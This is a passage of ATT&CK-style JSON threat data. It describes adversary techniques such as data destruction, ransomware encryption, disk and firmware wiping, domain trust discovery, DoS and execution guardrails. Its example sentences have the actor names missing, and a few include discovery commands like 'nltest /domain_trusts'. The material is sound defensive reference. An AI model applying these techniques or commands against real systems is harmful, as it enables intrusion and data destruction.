  "attack-pattern--d45a3d09-b3cf-48f4-9f0f-f521ee5cb05c": {
    "id": "T1485",
    "name": "Data Destruction",
    "examples": [],
    "similar_words": [
      "Data Destruction"
    ],
    "description": "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as del and rm often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.Adversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018).In cloud environments, adversaries may leverage access to delete cloud storage objects, machine images, database instances, and other infrastructure crucial to operations to damage an organization or their customers.(Citation: Data Destruction - Threat Post)(Citation: DOJ  - Cisco Insider) Similarly, they may delete virtual machines from on-prem virtualized environments.",
    "example_uses": [
      "can delete specified files from a targeted system.",
      "can corrupt files by overwriting the first 1 MB with `0xcc` and appending random extensions.",
      "s data wiper module clears registry keys and overwrites both ICS configuration and Windows files.",
      "has deleted the target's systems and resources both on-premises and in the cloud.",
      "has destroyed Linux-based databases as part of its ransomware capabilities.",
      "has used a custom secure delete function to overwrite file contents with data from heap memory.",
      "performs an in-depth wipe of the target filesystem and various attached storage devices through either a data overwrite or calling various IOCTLS to erase it.",
      "has the capability to destroy files and folders.",
      "can overwrite files with random data before deleting them.",
      "can recursively wipe folders and files in `Windows` `Program Files` `Program Files(x86)` `PerfLogs` `Boot System` `Volume Information` and `AppData` folders using `FSCTL_MOVE_FILE`.  can also overwrite symbolic links and big files in `My Documents` and on the Desktop with random bytes.",
      "attempts to overwrite operating system files and disk structures with image files. In a later variant randomly generated data was used for data overwrites.",
      "has a command to write random data across a file and delete it.",
      "During the   deployed  on the victims IT environment systems to wipe files related to the OT capabilities along with mapped drives and physical drive partitions.",
      "overwrites files locally and on remote shares.",
      "has used a custom secure delete function to make deleted files unrecoverable.",
      "has used tools to delete files and folders from victims' desktops and profiles.",
      "can work alphabetically through drives on a compromised system to take ownership of and overwrite all files.",
      "deletes data in a way that makes it unrecoverable.",
      "2 contains a Destroy plug-in that destroys data stored on victim hard drives by overwriting file contents.",
      "was used in  to write to protected system locations such as the MBR and disk partitions in an effort to destroy data.",
      "can fill a victim's files and directories with zero-bytes in replacement of real content before deleting them.",
      "deletes system files to make the OS unbootable.  also targets and deletes files with 35 different file extensions.",
      "has used the  KillDisk component to overwrite files on Windows-based Human-Machine Interfaces.",
      "can overwrite files indicated by the attacker before deleting them.",
      "has a disk wiper module that targets files other than those in the Windows directory.",
      "overwrites files on victim systems with random data to effectively destroy them.",
      "deletes files on network drives but corrupts and overwrites with random data files stored locally.",
      "has used   and the  KillDisk component to overwrite files on victim systems.  Additionally  has used the JUNKMAIL tool to overwrite files with null bytes.",
      "initially masqueraded as ransomware but actual functionality is a data destruction tool supported by an internal name linked to an early version wiper-action.  writes random data to original files after an encrypted copy is created along with resizing the original file to zero and changing time property metadata before finally deleting the original file.",
      "can initiate a destructive payload depending on the operating system check through resizing and reformatting portions of the victim machine's disk leading to system instability and potential data corruption.",
      "can perform an in-depth wipe of victim filesystems and attached storage devices through either data overwrite or calling various IOCTLS to erase them similar to ."
    ]
  },
  "attack-pattern--b80d107d-fa0d-4b60-9684-b0433e8bdba0": {
    "id": "T1486",
    "name": "Data Encrypted for Impact",
    "examples": [],
    "similar_words": [
      "Data Encrypted for Impact"
    ],
    "description": "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018)In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in order to unlock and/or gain access to manipulate these files.(Citation: CarbonBlack Conti July 2020) In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) Adversaries may also encrypt virtual machines hosted on ESXi or other hypervisors.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021) To maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware may also leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001), such as changing victim wallpapers or ESXi server login messages, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").(Citation: NHS Digital Egregor Nov 2020)(Citation: Varonis)In cloud environments, storage objects within compromised accounts may also be encrypted.(Citation: Rhino S3 Ransomware Part 1) For example, in AWS environments, adversaries may leverage services such as AWSs Server-Side Encryption with Customer Provided Keys (SSE-C) to encrypt data.(Citation: Halcyon AWS Ransomware 2025)",
    "example_uses": [
      "has disrupted systems by encrypting files on targeted machines claiming to decrypt files if a ransom payment is made.  has used the ChaCha algorithm based on Salsa20 and an RSA algorithm to encrypt files.",
      "has encrypted files and disks using AES-128-CBC and RSA-2048.",
      "encrypts a set of file extensions on a host deletes the original files and provides a ransom note with no contact information.",
      "has used Hermes ransomware to encrypt files with AES256.",
      "encrypts files on the local machine and mapped drives prior to displaying a note demanding a ransom.",
      "uses a multi-threaded encryption process that can partially encrypt targeted files with the OpenSSL library and the AES256 algorithm.",
      "has encrypted files and demanded Bitcoin to decrypt those files.",
      "can use ChaCha8 and ECDH to encrypt data.",
      "can encrypt files on victim systems and demands a ransom to decrypt the files.",
      "has encrypted files using an RSA key though the `CryptEncrypt` API and has appended filenames with .lock64.",
      "has the ability to encrypt system data and add the .cuba extension to encrypted files.",
      "can deploy follow-on ransomware payloads.",
      "has the ability to encrypt Windows devices Linux devices and VMWare instances.",
      "has leveraged the CryptoPP C++ library to encrypt files on target systems using AES and appended filenames with `.enc`.",
      "has used BitLocker and DiskCryptor to encrypt targeted workstations.",
      "has encrypted files including core Windows OS files using RSA-OAEP MGF1 and then demanded Bitcoin be paid for the decryption key.",
      "can use public and private key pair encryption to encrypt files for ransom payment.",
      "uses standard encryption library functions to encrypt files.",
      "can encrypt files on a compromised host with RC6 and encrypts the key with RSA-1024.",
      "has encrypted files and network resources using AES-256 and added an `.avos` `.avos2` or `.AvosLinux` extension to filenames.",
      "can use an embedded RSA-2048 public key to encrypt victim data for ransom.",
      "has used BlackCat ransomware to encrypt files on VMWare ESXi servers.",
      "can import a hard-coded RSA 1024-bit public key generate a 128-bit RC4 key for each file and encrypt the file in place appending .locked to the filename.",
      "can encrypt data on victim machines using a Sosemanuk stream cipher with an Elliptic-curve DiffieHellman (ECDH) generated key.",
      "encrypts user files and demands that a ransom be paid in Bitcoin to decrypt those files.",
      "has encrypted virtual disk volumes on ESXi servers using a version of Darkside ransomware.",
      "has encrypted drives using the core encryption mechanism from DiskCryptor.",
      "can encrypt files with the ChaCha20 cypher and using a multithreaded process to increase speed.",
      "can encrypt data and leave a ransom note.",
      "During  the threat actors used  ransomware to encrypt files on the compromised network.",
      "has used RSA and AES-CBC encryption algorithm to encrypt a list of targeted file extensions.",
      "During  the threat actors used  ransomware to encrypt a compromised network.",
      "has used the open-source library Mbed Crypto and generated AES keys to carry out the file encryption process.",
      "encrypts the victims machine followed by asking the victim to pay a ransom.",
      "can use an embedded NTRU public key to encrypt data for ransom.",
      "can use CreateIoCompletionPort() PostQueuedCompletionStatus() and GetQueuedCompletionPort() to rapidly encrypt files excluding those with the extensions of .exe .dll and .lnk. It has used a different AES-256 encryption key per file with a bundled RAS-4096 public encryption key that is unique for each victim.  can use Windows Restart Manager to ensure files are unlocked and open for encryption.",
      "has maliciously encrypted victim's database systems and demanded a cryptocurrency ransom be paid.",
      "can encrypt data on victim's machines using RSA and AES algorithms in order to extort a ransom payment for decryption.",
      "has used  ransomware to encrypt data at targeted organizations in transportation and related logistics industries in Ukraine and Poland.",
      "encrypts files in victim environments as part of ransomware operations.",
      "can encrypt all non-system files using a hybrid AES-RSA algorithm prior to displaying a ransom note.",
      "has encrypted domain-controlled systems using .",
      "encrypts user files and disk structures like the MBR with 2048-bit RSA.",
      "encrypts victim files using RSA-2048 encryption and demands a ransom be paid in Bitcoin to decrypt those files.",
      "used a ransomware called Encryptor RaaS to encrypt files on the targeted systems and provide a ransom note to the user.",
      "has used a combination of symmetric (AES) and asymmetric (RSA) encryption to encrypt files. Files have been encrypted with their own AES key and given a file extension of .RYK. Encrypted directories have had a ransom note of RyukReadMe.txt written to the directory.",
      "encrypts the victim system using a combination of AES256 and RSA encryption schemes.",
      "can encrypt files on infected machines to extort victims.",
      "has a ransomware component that encrypts files with an AES key that is also RSA-1028 encrypted.",
      "can encrypt files using AES RSA and RC4 and will add the .clop extension to encrypted files.",
      "has used a wide variety of ransomware such as  Locky Jaff Bart Philadelphia and GlobeImposter to encrypt victim files and demand a ransom payment.",
      "performs AES-CBC encryption on files under ~/Documents ~/Downloads and~/Desktop with a fixed key and renames files to give them a .enc extension. Only files with sizes less than 500MB are encrypted.",
      "can encrypt files on a targeted system appending them with the suffix .seth.",
      "has an operational mode for encrypting data instead of overwriting it.",
      "will search for an RSA encryption key and then perform its encryption process on the system files.",
      "has deployed ransomware such as  White Rabbit and attempted to execute Noberus on compromised networks.",
      "encrypts victim filesystems for financial extortion purposes.",
      "has used  to encrypt victim's data.",
      "During  threat actors used  ransomware to encrypt files on targeted systems.",
      "targets a common set of file types such as documents certificates and database files for encryption while avoiding executable dynamic linked libraries and similar items.",
      "encrypts files on targeted hosts with an AES-RSA hybrid encryption encrypting every other file portion of 0x100000 bytes.",
      "can RC4 encrypt content in blocks on targeted systems.",
      "can encrypt data on victim systems including through the use of partial encryption and multi-threading to speed encryption.",
      "has encrypted domain-controlled systems using . Additionally  used  to execute a ransomware script.",
      "used a ransomware called Encryptor RaaS to encrypt files on the targeted systems and provide a ransom note to the user.  also used Microsoft Bitlocker to encrypt workstations and Jeticos BestCrypt to encrypt servers.",
      "creates new encrypted versions of files then deletes the originals with the new filenames consisting of a random GUID and .lock for an extension.",
      "has deployed ransomware in victim environments.",
      "is ransomware using a shared key across victims for encryption.",
      "is a ransomware variant associated with  operations.",
      "can encrypt files with the ChaCha20 cypher and using a multithreaded process to increase speed.  has also encrypted files while the victim system is in safe mode appending `.basta` upon completion.",
      "uses the legitimate BitLocker application to encrypt victim files for ransom.",
      "is a financially-motivated entity linked to the deployment of  ransomware in victim environments.",
      "can use Elliptic Curve Encryption to encrypt files on targeted systems.  can also skip content at regular intervals (ex. encrypt 1 MB skip 3 MB) to optomize performance and enable faster encryption for large files.",
      "The  encryptor targets the `/vmfs/volumes/` path by default and can use the rust-crypto 0.2.36 library crate for the encryption processes.",
      "can encrypt targeted data using the AES-256 ChaCha20 or RSA-2048 algorithms.",
      "can use standard AES and elliptic-curve cryptography algorithms to encrypt victim data.",
      "has encrypted victim files for ransom. Early versions of BlackByte ransomware used a common key for encryption but later versions use unique keys per victim.",
      "can encrypt files on targeted Windows hosts leaving them with a .powerranges file extension.",
      "can encrypt victim filesystems for financial extortion purposes including through the use of the ChaCha20 and ChaCha8 stream ciphers."
    ]
  },
  "attack-pattern--5909f20f-3c39-4795-be06-ef1ea40d350b": {
    "id": "T1491",
    "name": "Defacement",
    "examples": [],
    "similar_words": [
      "Defacement"
    ],
    "description": "Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for [Defacement](https://attack.mitre.org/techniques/T1491) include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of [Defacement](https://attack.mitre.org/techniques/T1491) in order to cause user discomfort, or to pressure compliance with accompanying messages. ",
    "example_uses": []
  },
  "attack-pattern--b82f7d37-b826-4ec9-9391-8e121c78aed7": {
    "id": "T1488",
    "name": "Disk Content Wipe",
    "examples": [],
    "similar_words": [
      "Disk Content Wipe"
    ],
    "description": "Adversaries may erase the contents of storage devices on specific systems as well as large numbers of systems in a network to interrupt availability to system and network resources.\n\nAdversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries have been observed leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364) to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485) because sections of the disk erased instead of individual files.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [Credential Dumping](https://attack.mitre.org/techniques/T1003), and [Windows Admin Shares](https://attack.mitre.org/techniques/T1077).(Citation: Novetta Blockbuster Destructive Malware)",
    "example_uses": []
  },
  "attack-pattern--2e114e45-2c50-404c-804a-3af9564d240e": {
    "id": "T1487",
    "name": "Disk Structure Wipe",
    "examples": [],
    "similar_words": [
      "Disk Structure Wipe"
    ],
    "description": "Adversaries may corrupt or wipe the disk data structures on hard drive necessary to boot systems; targeting specific critical systems as well as a large number of systems in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1487) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1488) if all sectors of a disk are wiped.\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [Credential Dumping](https://attack.mitre.org/techniques/T1003), and [Windows Admin Shares](https://attack.mitre.org/techniques/T1077).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
    "example_uses": []
  },
  "attack-pattern--54456690-84de-4538-9101-643e26437e09": {
    "id": "T1483",
    "name": "Domain Generation Algorithms",
    "examples": [],
    "similar_words": [
      "Domain Generation Algorithms"
    ],
    "description": "Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)\n\nDGAs can take the form of apparently random or “gibberish” strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)\n\nAdversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)",
    "example_uses": []
  },
  "attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0": {
    "id": "T1482",
    "name": "Domain Trust Discovery",
    "examples": [],
    "similar_words": [
      "Domain Trust Discovery"
    ],
    "description": "Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)",
    "example_uses": [
      "has modules for enumerating domain trusts.",
      "can use  tools to obtain information about the domain.",
      "can gather information about organizational units (OUs) and domain trusts from Active Directory.",
      "can gather information about domain trusts.",
      "uses the built-in  utility or tools such as  to enumerate Active Directory trusts in victim environments.",
      "has nltest /domain_trusts to identify domain trust relationships.",
      "can profile compromised systems to identify domain trust relationships.",
      "may be used to enumerate trusted domains by using commands such as nltest /domain_trusts.",
      "can run nltest /domain_trusts /all_trusts for domain trust discovery.",
      "has used  to obtain information about domain controllers.",
      "can use LDAP queries and `nltest /domain_trusts` for domain trust discovery.",
      "has the ability to map domain trusts and identify misconfigurations for potential abuse.",
      "can use `nltest.exe /domain_trusts` to discover domain trust relationships on a compromised machine.",
      "During the   used the `Get-AcceptedDomain` PowerShell cmdlet to enumerate accepted domains through an Exchange Management Shell. They also used  to enumerate domains and to discover trust between federated domains.",
      "has used a web shell to execute `nltest /trusted_domains` to identify trust relationships.",
      "can be used to gather information on domain trusts with dsquery * -filter (objectClass=trustedDomain) -attr *.",
      "has modules such as Get-NetDomainTrust and Get-NetForestTrust to enumerate domain and forest trusts.",
      "can gather information about domain trusts by utilizing .",
      "has retrieved a list of trusted domains by using nltest.exe /domain_trusts.",
      "During  the threat actors used the command `nltest /domain_trusts /all_trusts` to enumerate domain trusts.",
      "used  during initial discovery.",
      "will gather information concerning the Windows Domain the victim machine is a member of during execution.",
      "includes modules for collecting information on local domain users and permissions.",
      "can run `C:\\Windows\\System32\\cmd.exe /c nltest /domain_trusts` to discover domain trusts.",
      "can identify Active Directory information and related items.",
      "enumerated Active Directory information and trust relationships during operations.",
      "performed Active Directory enumeration of victim environments during .",
      "has used tools such as  to make Active Directory queries.",
      "has enumerated domain accounts and access during intrusions."
    ]
  },
  "attack-pattern--c675646d-e204-4aa8-978d-e3d6d65885c4": {
    "id": "T1499",
    "name": "Endpoint Denial of Service",
    "examples": [],
    "similar_words": [
      "Endpoint Denial of Service"
    ],
    "description": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)An Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).To perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.Botnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)In cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)For attacks attempting to saturate the providing network, see [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
    "example_uses": [
      "has the capability to use a Denial of Service module.",
      "temporarily disrupted service to Georgian government non-government and private sector websites after compromising a Georgian web hosting provider in 2019.",
      "has a feature to perform SYN flood attack on a host."
    ]
  },
  "attack-pattern--853c4192-4311-43e1-bfbb-b11b14911852": {
    "id": "T1480",
    "name": "Execution Guardrails",
    "examples": [],
    "similar_words": [
      "Execution Guardrails"
    ],
    "description": "Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversarys campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.(Citation: FireEye Outlook Dec 2019)Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.Adversaries may identify and block certain user-agents to evade defenses and narrow the scope of their attack to victims and platforms on which it will be most effective. A user-agent self-identifies data such as a user's software application, operating system, vendor, and version. Adversaries may check user-agents for operating system identification and then only serve malware for the exploitable software while ignoring all other operating systems.(Citation: Trellix-Qakbot)",
    "example_uses": [
      "can ensure it executes only on intended systems by identifying the victim's volume serial number hostname and/or DNS domain.",
      "can terminate itself if specific execution flags are not present.",
      "compares file names and paths to a list of excluded names and directory names during encryption.",
      "uses per-victim links for hosting malicious archives such as ZIP files in services such as SharePoint to prevent other entities from retrieving them.",
      "has the ability to check for the presence of a specific DLL and terminate if it is not found.",
      "can call window.location.pathname to ensure that embedded files are being executed from the C: drive and will terminate if they are not.",
      "is only delivered to a compromised host if the victim's IP address is on an allow-list.",
      "can only execute correctly if the word `Platypus` is passed to it on the command line.",
      "checks for specific operating systems on 32-bit machines Registry keys and dates for vulnerabilities and will exit execution if the values are not met.",
      "only replaces SolarWinds Orion source code if the MD5 checksums of both the original source code file and backdoored replacement source code match hardcoded values.",
      "can check its current working directory and for the presence of a specific file and terminate if specific values are not found.",
      "can check for the presence of KM.EkeyAlmaz1C.dll and will halt execution unless it is in the same directory as the rest of the malware's components.",
      "can execute a task which leads to execution if it finds a process name containing creensaver.",
      "creates a zero byte PID file at `/var/run/haldrund.pid`.  uses this file to determine if it is already running on a system to ensure only one instance is executing at a time.",
      "will check for the presence of several security products on victim machines and will avoid UAC bypass mechanisms if they are identified.  can use specific cookie values in HTTP requests to command and control infrastructure to validate that requests for second stage payloads originate from the initial downloader script.",
      "ransomware variant requires that a base64-encoded argument is passed when executed that is used as the Public Key for subsequent encryption operations. If  is executed without this argument it automatically runs a self-delete function.",
      "can use the DNS domain name of a compromised host to create a decryption key to ensure a malicious payload can only execute against the intended targets.",
      "requires four command line arguments to execute correctly otherwise it will produce a message box and halt execution.",
      "has used geoblocking to limit downloads of the malicious file to specific geographic locations.",
      "checks for the presence of a configuration file before completing execution.",
      "will terminate without proceeding to encryption if the infected machine is on a list of allowlisted machines specified in its configuration.",
      "On macOS  checks the existence of a process identification number (PID) file `/Users/Shared/irc.pid` to verify if  is currently running.",
      "variants only execute if the keyboard layout or language matches a set list of variables.",
      "included the use of Cloudflare geofencing mechanisms to limit payload download activity during .",
      "can make execution dependent on specific parameters including a unique passphrase and the system language of the targeted host not being found on a set exclusion list.",
      "will execute an empty infinite loop if it detects it is being run in the context of a debugger.",
      "will not execute on hosts where the system language is set to a language spoken in the Commonwealth of Independent States region.",
      "creates a mutex value with a hard-coded name and terminates if that mutex already exists on the victim system.  checks the system language to see if it matches one of a list of hard-coded values; if a match is found the malware will terminate.",
      "will exit its main function if the victim domain name does not match provided criteria.",
      "uses a servicemain function to verify its environment to ensure it can only be executed as a service as well as the existence of a configuration file in a specified directory.",
      "stopped execution if identified language settings on victim machines was Russian or one of several language associated with former Soviet republics.  has used ransomware variants requiring a key passed on the command line for the malware to execute.",
      "verifies it is executing from a specific path during execution.",
      "will fail to execute if the targeted `/vmfs/volumes/` path does not exist or is not defined."
    ]
  },
  "attack-pattern--f5bb433e-bdf6-4781-84bc-35e97e43be89": {
    "id": "T1495",
    "name": "Firmware Corruption",
    "examples": [],
    "similar_words": [
      "Firmware Corruption"
    ],
    "description": "Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system.(Citation: Symantec Chernobyl W95.CIH) Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices may include the motherboard, hard drive, or video cards.In general, adversaries may manipulate, overwrite, or corrupt firmware in order to deny the use of the system or devices. For example, corruption of firmware responsible for loading the operating system for network devices may render the network devices inoperable.(Citation: dhs_threat_to_net_devices)(Citation: cisa_malware_orgs_ukraine) Depending on the device, this attack may also result in [Data Destruction](https://attack.mitre.org/techniques/T1485). ",
    "example_uses": [
      "has used an executable that installs a modified bootloader to prevent normal boot-up.",
      "module Trickboot can write or erase the UEFI/BIOS firmware of a compromised device."
    ]
  },
  "attack-pattern--ebb42bbe-62d7-47d7-a55f-3b08b61d792d": {
    "id": "T1484",
    "name": "Domain or Tenant Policy Modification",
    "examples": [],
    "similar_words": [
      "Group Policy Modification",
      "Domain or Tenant Policy Modification"
    ],
    "description": "Adversaries may modify the configuration settings of a domain or identity tenant to evade defenses and/or escalate privileges in centrally managed environments. Such services provide a centralized means of managing identity resources such as devices and accounts, and often include configuration settings that may apply between domains or tenants such as trust relationships, identity syncing, or identity federation.Modifications to domain or tenant settings may include altering domain Group Policy Objects (GPOs) in Microsoft Active Directory (AD) or changing trust settings for domains, including federation trusts relationships between domains or tenants.With sufficient permissions, adversaries can modify domain or tenant policy settings. Since configuration settings for these services apply to a large number of identity resources, there are a great number of potential attacks malicious outcomes that can stem from this abuse. Examples of such abuse include:  * modifying GPOs to push a malicious [Scheduled Task](https://attack.mitre.org/techniques/T1053/005) to computers throughout the domain environment(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)* modifying domain trusts to include an adversary-controlled domain, allowing adversaries to  forge access tokens that will subsequently be accepted by victim domain resources(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks)* changing configuration settings within the AD environment to implement a [Rogue Domain Controller](https://attack.mitre.org/techniques/T1207).* adding new, adversary-controlled federated identity providers to identity tenants, allowing adversaries to authenticate as any user managed by the victim tenant (Citation: Okta Cross-Tenant Impersonation 2023)Adversaries may temporarily modify domain or tenant policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.",
    "example_uses": []
  },
  "attack-pattern--f5d8eed6-48a9-4cdf-a3d7-d1ffa99c3d2a": {
    "id": "T1490",
    "name": "Inhibit System Recovery",
    "examples": [],
    "similar_words": [
      "Inhibit System Recovery"
    ],
